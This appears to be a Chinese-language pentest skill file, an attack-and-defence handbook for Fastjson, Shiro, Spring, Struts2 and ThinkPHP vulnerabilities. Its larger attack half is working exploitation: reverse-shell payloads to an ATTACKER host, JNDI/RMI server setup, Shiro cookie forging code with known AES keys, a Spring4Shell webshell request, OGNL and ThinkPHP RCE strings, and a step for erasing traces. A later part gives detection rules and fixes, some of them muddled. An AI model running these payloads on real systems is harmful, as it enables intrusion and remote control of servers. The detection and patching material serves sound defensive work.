---
name: java-framework-vulns
description: >
  全面覆盖 Java 主流框架的反序列化与 RCE 漏洞。涵盖 Fastjson（autoType 机制、JNDI 注入、
  1.2.24/1.2.47/1.2.68/1.2.80 各版本绕过）、Apache Shiro（CVE-2016-4437 rememberMe
  反序列化、Shiro-550 AES Key 爆破、Shiro-721 Padding Oracle）、Spring（CVE-2022-22965
  Spring4Shell、CVE-2022-22947 SpEL RCE、CVE-2018-1270 STOMP、CVE-2022-22963
  Cloud Function SpEL）、Struts2（OGNL 表达式注入 S2-001~S2-062 全系列绕过）、
  ThinkPHP（5.0.x/5.1.x RCE、反序列化链）。攻防合一：Part A 完整利用链与 PoC + Part B 检测与修复。
domain: cybersecurity
subdomain: service-security
tags: [fastjson, shiro, spring, spring4shell, struts2, thinkphp, deserialization, rce, jndi, ognl, spel, java, cve, s2-045, s2-057, s2-061]
version: 2.0.0
---

# Java 框架漏洞 — 完整攻防手册

## 适用场景

- 渗透测试中发现目标使用 Java Web 框架（Fastjson/Shiro/Spring/Struts2/ThinkPHP）
- 红队演练中需要利用已知 CVE 获取 RCE
- 应用安全评估中验证框架版本是否受影响
- 应急响应中排查框架漏洞利用痕迹

---

# Part A：攻击方法论

## 一、Fastjson 反序列化

### 1. 漏洞原理

Fastjson 通过 `@type` 字段指定反序列化的目标类，并自动调用该类的 setter/getter 方法。攻击者构造恶意 JSON，让 `@type` 指向危险类（如 `JdbcRowSetImpl`），在 setter 中触发 JNDI 远程类加载，实现 RCE。

```
正常流程：JSON.parseObject(json) → @type 指定类 → 反射实例化 → setter 设值
攻击流程：@type=JdbcRowSetImpl → setDataSourceName(rmi://evil) → connect() → JNDI lookup → 加载远程恶意类
```

### 2. JNDI 注入利用链

| 利用链 | 触发类 | 说明 |
|--------|--------|------|
| **JdbcRowSetImpl** | `com.sun.rowset.JdbcRowSetImpl` | 经典链，setter 触发 JNDI lookup |
| **TemplatesImpl** | `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` | 直接加载字节码 |
| **BCEL** | `com.sun.org.apache.bcel.internal.util.ClassLoader` | BCEL 编码绕过 |
| **LDAP** | 任意 | LDAP 比 RMI 利用范围更广 |

### 3. 各版本绕过

#### CVE-2019-12086（Fastjson < 1.2.47）

**1.2.24 经典 payload**（JdbcRowSetImpl + JNDI）：
```json
{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://ATTACKER:1099/Exploit",
    "autoCommit": true
  }
}
```

```bash
# 1. 编译恶意类
cat > Exploit.java << 'EOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1"});
        } catch (Exception e) {}
    }
}
EOF
javac Exploit.java

# 2. 启动 HTTP 服务托管 class
python3 -m http.server 8888

# 3. 启动 RMI 服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://ATTACKER:8888/#Exploit" 1099

# 4. 发送 payload
curl -X POST "http://target/api" -H "Content-Type: application/json" -d '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ATTACKER:1099/Exploit","autoCommit":true}}'
```

#### 1.2.47 绕过（通杀所有版本）

**原理**：利用 `java.lang.Class` 的缓存机制，先缓存类再调用危险方法。

```json
{
  "a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
  "b": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://ATTACKER:1389/Exploit", "autoCommit": true}
}
```

#### 1.2.68 safeMode 绕过

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["BASE64_ENCODED_CLASSFILE"],
  "_name": "a",
  "_tfactory": {},
  "_outputProperties": {}
}
```

### 4. 自动化利用工具

```bash
# fastjson-vul-tools
java -jar fastjson_tool.jar target 80 "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"

# FastjsonScan（版本探测）
java -jar FastjsonScan.jar -u http://target

# JNDI-Injection-Exploit
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" -A "ATTACKER"
```

### 5. JDK 版本限制

| JDK 版本 | RMI 利用 | LDAP 利用 |
|---------|---------|----------|
| < 8u121 | ✓ | ✓ |
| 8u121~8u190 | ✗（com.sun.jndi.rmi.object.trustURLCodebase=false） | ✓ |
| > 8u191 | ✗ | ✗（com.sun.jndi.ldap.object.trustURLCodebase=false） |

**高版本 JDK 绕过**：使用本地 Gadget（如 `org.apache.naming.factory.BeanFactory` + EL 表达式）。

---

## 二、Apache Shiro 反序列化

### 1. Shiro-550（CVE-2016-4437）

**影响版本**：Shiro < 1.2.5（1.2.4 及以下默认 AES Key）

**原理**：Shiro 的 rememberMe 功能使用硬编码的 AES Key（`kPH+bIxk5D2deZiIxcaaaA==`）加密序列化的用户对象。攻击者用该 Key 加密恶意序列化数据，服务端解密后反序列化触发 RCE。

```python
# key = base64decode("kPH+bIxk5D2deZiIxcaaaA==")
# 1. 用 ysoserial 生成 CommonsBeanutils1 payload
java -jar ysoserial.jar CommonsBeanutils1 "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" > payload.bin

# 2. AES-CBC 加密 + base64 编码
python3 shiro_exploit.py -t http://target -f payload.bin
```

```python
# shiro_exploit.py 核心逻辑
import base64, uuid
from Crypto.Cipher import AES

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
iv = uuid.uuid4().bytes
cipher = AES.new(key, AES.MODE_CBC, iv)
payload = open("payload.bin", "rb").read()
# PKCS5 padding
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
encrypted = iv + cipher.encrypt(payload)
rememberMe = base64.b64encode(encrypted).decode()

# 发送
import requests
requests.get("http://target/", cookies={"rememberMe": rememberMe})
```

**常用 Key 列表（爆破）**：
```
kPH+bIxk5D2deZiIxcaaaA==    # 默认
2AvVhdsgUs0FSA3SDFAdag==
3AvVhmFUs7FfA3SDFAdag==
4AvVhmFUs7FfA3SDFAdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hxxCDjsABXEQ==
wGiHplamyXlVB11UXWol8g==
...（共 100+ 已知 Key）
```

### 2. Shiro-721（CVE-2019-12422）

**影响版本**：Shiro < 1.4.2（1.4.1 及以下使用 CBC）

**原理**：不需要知道 Key，利用 Padding Oracle 攻击逐字节构造合法密文。需要在合法登录后获取有效的 rememberMe Cookie。

```bash
# 1. 正常登录获取 rememberMe Cookie
# 2. 使用 ShiroExp 工具进行 Padding Oracle 攻击
python3 shiro721_exploit.py -u http://target -c "valid_rememberMe_cookie" -g CommonsBeanutils1 -p "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
```

### 3. 检测 Shiro 存在

```bash
# Set-Cookie 中含 rememberMe=deleteMe 表示使用 Shiro
curl -I http://target/login | grep -i "rememberMe=deleteMe"

# 访问 /login，响应头含 RememberMe
```

### 4. Shiro 权限绕过（CVE-2020-1957 / CVE-2020-11989）

```bash
# CVE-2020-1957：/xxx/..;/admin/ 绕过权限
curl "http://target/xxx/..;/admin/page"

# CVE-2020-11989：/admin/;xxx 绕过
curl "http://target/admin/;xxx/page"

# CVE-2020-13933：/admin/%3bxxx
curl "http://target/admin/%3bxxx"
```

---

## 三、Spring 系列漏洞

### 1. Spring4Shell（CVE-2022-22965）

**影响版本**：Spring Framework 5.3.0-5.3.17、5.2.0-5.2.19（需 JDK >= 9 + Tomcat WAR 部署）

**原理**：Spring 通过参数绑定机制将请求参数映射到对象属性，利用 `class.module.classLoader.resources.context.parent.pipeline.first.pattern` 属性链写 AccessLog，再写入 Webshell。

```bash
# 利用 payload（需配合 Tomcat + JDK9+）
curl -X POST "http://target/hello" \
  -H "suffix: %>//" \
  -H "c1: Runtime" \
  -H "c2: <%" \
  -H "DNT: 1" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7D.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# 访问 Webshell
curl "http://target/tomcatwar.jsp?pwd=j&cmd=id"
```

### 2. Spring Cloud Gateway SpEL RCE（CVE-2022-22947）

**影响版本**：Spring Cloud Gateway 3.1.0、3.0.0-3.0.6

```bash
# 1. 添加恶意路由
curl -X POST "http://target/actuator/gateway/routes/hacktest" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "hacktest",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"id\"}).getInputStream().readAllBytes())}"
      }
    }],
    "uri": "http://example.com"
  }'

# 2. 刷新配置
curl -X POST "http://target/actuator/gateway/refresh"

# 3. 触发并获取结果
curl "http://target/actuator/gateway/routes/hacktest"

# 4. 清理痕迹
curl -X DELETE "http://target/actuator/gateway/routes/hacktest"
```

### 3. Spring Cloud Function SpEL（CVE-2022-22963）

```bash
curl -X POST "http://target/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\")" \
  -d "test"
```

### 4. Spring Boot Actuator 未授权

```bash
# 检测 Actuator 暴露
curl "http://target/actuator"
curl "http://target/actuator/env"           # 可能含密码
curl "http://target/actuator/heapdump"      # 堆转储含密码
curl "http://target/actuator/jolokia"       # JMX 接口

# 利用 env + refresh 写日志马
curl -X POST "http://target/actuator/env" \
  -H "Content-Type: application/json" \
  -d '{"name":"logging.pattern.level","value":"${jndi:ldap://ATTACKER/Exploit}"}'
curl -X POST "http://target/actuator/refresh"
```

### 5. Spring STOMP RCE（CVE-2018-1270）

**影响版本**：Spring Framework 5.0-5.0.5

```
# 通过 WebSocket + SpEL
CONNECT
accept-version:1.1,1.0
heart-beat:10000,10000

SUBSCRIBE
selector:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")
id:sub-0
destination:/topic/greetings
```

---

## 四、Struts2 OGNL 表达式注入

### 1. OGNL 注入原理

Struts2 使用 OGNL（Object-Graph Navigation Language）作为表达式语言。当用户输入未经严格过滤直接进入 OGNL 求值上下文，攻击者可注入任意 Java 代码。

### 2. 主要 CVE 系列

| CVE | 别名 | 影响版本 | 触发点 |
|-----|------|---------|--------|
| S2-001 | CVE-2007-4556 | 2.0.0-2.0.11 | `%{...}` 表达式回显 |
| S2-005 | CVE-2010-1870 | 2.0.0-2.1.8.1 | OGNL 参数名注入 |
| S2-008 | CVE-2011-3923 | 2.0.0-2.3.1.1 | devMode RCE |
| S2-009 | CVE-2011-3082 | 2.0.0-2.3.1.2 | 参数名 OGNL |
| S2-013 | CVE-2013-1966 | 2.0.0-2.3.14.1 | includeParams |
| S2-016 | CVE-2013-2251 | 2.0.0-2.3.15.1 | redirect 参数 |
| S2-032 | CVE-2016-3081 | 2.3.20-2.3.28 | method 动态调用 |
| S2-045 | CVE-2017-5638 | 2.3.5-2.3.32, 2.5-2.5.10 | Content-Type 头 |
| S2-046 | CVE-2017-5638 | 同上 | 文件上传 filename |
| S2-048 | CVE-2017-9791 | 2.3.x Struts1 插件 | 消息体 |
| S2-052 | CVE-2017-9805 | 2.1.1-2.3.33 | REST 插件 XStream |
| S2-053 | CVE-2017-12611 | 2.0.1-2.3.33 | Freemarker 标签 |
| S2-057 | CVE-2018-11776 | 2.0.4-2.5.16 | namespace 为空 |
| S2-061 | CVE-2020-17530 | 2.0.0-2.5.25 | 标签属性 OGNL |
| S2-062 | CVE-2021-31805 | 2.0.0-2.5.29 | S2-061 补丁绕过 |

### 3. 经典 Payload

#### S2-045（Content-Type 注入，最常用）

```bash
# 检测
curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}" "http://target/index.action"
```

#### S2-057（namespace 为空时触发）

```bash
# URL 路径中注入
curl "http://target/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D/help.action"
```

#### S2-061 / S2-062（最新）

```bash
# S2-061 通过标签属性触发
%{('Powered_by_WebLogic_RCE'.toString().substring(0,1).matches('[a-z]')?
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).
(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
(@org.apache.commons.io.IOUtils@write(#process.getInputStream(),#ros)).(#ros.flush())):1)}
```

### 4. Struts2 检测

```bash
# 检测 Struts2 指纹
curl -I http://target | grep -i "struts"
# 404 页面含 Struts 错误信息
curl http://target/notexist.action

# 使用 Struts2-Scan 自动检测版本与漏洞
python3 Struts2-Scan.py -u http://target
```

---

## 五、ThinkPHP RCE

### 1. ThinkPHP 5.0.x RCE

**影响版本**：ThinkPHP 5.0.0-5.0.23

```bash
# 经典 payload 1：invokeFunction
curl "http://target/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

# 经典 payload 2：执行命令
curl "http://target/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"

# 反弹 shell
curl "http://target/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ATTACKER/4444%200%3E%261%22"
```

### 2. ThinkPHP 5.1.x RCE

**影响版本**：ThinkPHP 5.1.0-5.1.30

```bash
# 路由方式
curl "http://target/index.php?s=index/\think\Request/input&filter[]=system&data=id"

# method 方式
curl -X POST "http://target/index.php?s=captcha" -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
```

### 3. ThinkPHP 5.0.23 方法覆盖

```bash
curl -X POST "http://target/index.php?s=captcha" \
  -d "_method=__construct&filter[]=system&server[REQUEST_METHOD]=id"
```

### 4. ThinkPHP 反序列化

```bash
# 使用 phpggc 生成 ThinkPHP 反序列化链
phpggc ThinkPHP/RCE1 system id | base64
# 找到反序列化入口后注入 Cookie / Header
```

### 5. 检测 ThinkPHP

```bash
# 报错页面含 ThinkPHP 标识
curl "http://target/index.php/index/index/index" -H "User-Agent: <script>"
# 版本探测
curl "http://target/index.php?s=captcha" # 5.0.10+ 有此路由
```

---

## 六、自动化利用工具汇总

### 1. 综合扫描

```bash
# Struts2-Scan
python3 Struts2-Scan.py -u http://target

# Shiro 检测
python3 shiro_scan.py -u http://target

# Fastjson 版本探测
java -jar FastjsonScan.jar -u http://target

# SpringBoot 检测
python3 SpringBoot-Scan.py -u http://target
```

### 2. JNDI 利用

```bash
# JNDI-Injection-Exploit（推荐）
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" \
  -A "ATTACKER_IP"

# marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://ATTACKER/Exploit" 1099
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/Exploit" 1389

# JNDIExploit
java -jar JNDIExploit.jar -i ATTACKER_IP
```

### 3. ysoserial（反序列化 payload 生成）

```bash
java -jar ysoserial.jar CommonsCollections1 "cmd" > cc1.ser
java -jar ysoserial.jar CommonsBeanutils1 "cmd" > cb1.ser
java -jar ysoserial.jar Jdk7u21 "cmd" > jdk7u21.ser
```

---

# Part B：检测规则与修复

## 一、检测规则

### 1. 日志关键字检测

```bash
# Fastjson
grep -E "(@type|java\.beans\.XMLDecoder|com\.sun\.rowset\.JdbcRowSetImpl|TemplatesImpl)" access.log

# Shiro rememberMe 异常长度
awk -F'rememberMe=' '{if(length($2) > 200) print}' access.log

# Spring4Shell
grep -E "class\.module\.classLoader" access.log

# Spring Actuator 异常访问
grep -E "/actuator/(env|heapdump|jolokia|refresh)" access.log

# Struts2 OGNL
grep -E "(ognl\.OgnlContext|com\.opensymphony|ProcessBuilder|Runtime\.getRuntime)" access.log

# ThinkPHP
grep -E "(think\\\\app/invokefunction|_method=__construct|filter\[\]=system)" access.log

# JNDI / Log4Shell
grep -E "\\\$\{jndi:(ldap|rmi)" access.log
```

### 2. Suricata 规则

```
# Fastjson JNDI
alert http any any -> $HOME_NET any (msg:"Fastjson JNDI Injection"; \
  content:"@type"; content:"JdbcRowSetImpl"; sid:2000001; rev:1;)

# Shiro rememberMe 超长（反序列化特征）
alert http any any -> $HOME_NET any (msg:"Shiro Deserialization Attempt"; \
  content:"rememberMe="; pcre:"/rememberMe=[A-Za-z0-9+/=]{300,}/"; sid:2000002; rev:1;)

# Spring4Shell
alert http any any -> $HOME_NET any (msg:"Spring4Shell CVE-2022-22965"; \
  content:"class.module.classLoader"; sid:2000003; rev:1;)

# Spring Cloud Gateway
alert http any any -> $HOME_NET any (msg:"Spring Cloud Gateway SpEL RCE"; \
  content:"/actuator/gateway/routes"; content:"T(java.lang.Runtime)"; sid:2000004; rev:1;)

# Struts2 S2-045
alert http any any -> $HOME_NET any (msg:"Struts2 S2-045 OGNL"; \
  content:"multipart/form-data"; content:"ognl.OgnlContext"; sid:2000005; rev:1;)

# ThinkPHP RCE
alert http any any -> $HOME_NET any (msg:"ThinkPHP RCE"; \
  content:"think\\app/invokefunction"; nocase; sid:2000006; rev:1;)
```

### 3. Sigma 规则

```yaml
title: Java Framework Deserialization Exploitation
status: experimental
logsource:
  category: webserver
detection:
  selection_jndi:
    cs-uri-query|contains:
      - "rmi://"
      - "ldap://"
      - "${jndi:"
  selection_payload:
    cs-uri-query|contains:
      - "java.lang.Runtime"
      - "ProcessBuilder"
      - "getInputStream"
  condition: selection_jndi or selection_payload
level: critical
```

## 二、修复建议

### 1. Fastjson 修复

| 措施 | 说明 |
|------|------|
| **升级版本** | >= 1.2.83（开启 safeMode） |
| **开启 safeMode** | `ParserConfig.getGlobalInstance().setSafeMode(true)` 禁用 @type |
| **使用 fastjson2** | 迁移到 fastjson2，默认安全 |
| **禁用 autoType** | `ParserConfig.getGlobalInstance().setAutoTypeSupport(false)` |
| **使用 Jackson/Gson** | 迁移到默认安全的 JSON 库 |

### 2. Shiro 修复

| 措施 | 说明 |
|------|------|
| **升级版本** | >= 1.7.1 |
| **自定义 AES Key** | 不要使用默认 Key |
| **禁用 rememberMe** | 如不需要，关闭该功能 |
| **使用 Java 原生序列化** | 避免反序列化漏洞 |

### 3. Spring 修复

```xml
<!-- 升级到最新版本 -->
<!-- Spring Framework >= 5.3.18 / 5.2.20 -->
<!-- Spring Cloud Gateway >= 3.1.1 -->

<!-- 禁用 Actuator 敏感端点 -->
management.endpoints.web.exposure.include=health,info
management.endpoint.env.enabled=false
management.endpoint.heapdump.enabled=false

<!-- 自定义 DataBinder -->
@InitBinder
public void setAllowedFields(WebDataBinder dataBinder) {
    String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
    dataBinder.setDisallowedFields(denylist);
}
```

### 4. Struts2 修复

| 措施 | 说明 |
|------|------|
| **升级版本** | >= 2.5.30（最新） |
| **迁移框架** | 强烈建议迁移到 Spring Boot |
| **禁用动态方法调用** | `struts.enable.DynamicMethodInvocation=false` |
| **禁用 OGNL 表达式** | 配置 `struts.ognl.allowStaticMethodAccess=false` |
| **WAF 防护** | 过滤 Content-Type 中的 OGNL 关键字 |

### 5. ThinkPHP 修复

| 措施 | 说明 |
|------|------|
| **升级版本** | >= 5.0.24 / 5.1.31 |
| **修改路由** | 禁用 `s` 参数路由 |
| **关闭调试模式** | `app_debug=false` |
| **过滤输入** | 对 `method`、`filter` 参数严格过滤 |

## 三、WAF 规则参考

```
# ModSecurity 规则示例
# Fastjson
SecRule REQUEST_BODY "@rx @type.*JdbcRowSetImpl|@type.*TemplatesImpl" \
  "id:100001,phase:2,deny,status:403,msg:'Fastjson Deserialization'"

# Shiro 长度检测
SecRule REQUEST_COOKIES:rememberMe "@rx ^[A-Za-z0-9+/=]{500,}$" \
  "id:100002,phase:1,deny,status:403,msg:'Shiro Deserialization'"

# Struts2
SecRule REQUEST_HEADERS:Content-Type "@rx ognl\.OgnlContext|java\.lang\.Runtime" \
  "id:100003,phase:1,deny,status:403,msg:'Struts2 OGNL'"

# Spring4Shell
SecRule ARGS_NAMES "@rx ^class\." \
  "id:100004,phase:2,deny,status:403,msg:'Spring4Shell'"
```

## 参考资源

- Fastjson 安全公告：https://github.com/alibaba/fastjson/wiki/security_update_20170315
- Shiro Security：https://shiro.apache.org/security.html
- Spring Security：https://spring.io/security
- Struts2 Security：https://cwiki.apache.org/confluence/display/WW/Security+Bulletins
- ThinkPHP 安全：https://blog.thinkphp.cn/
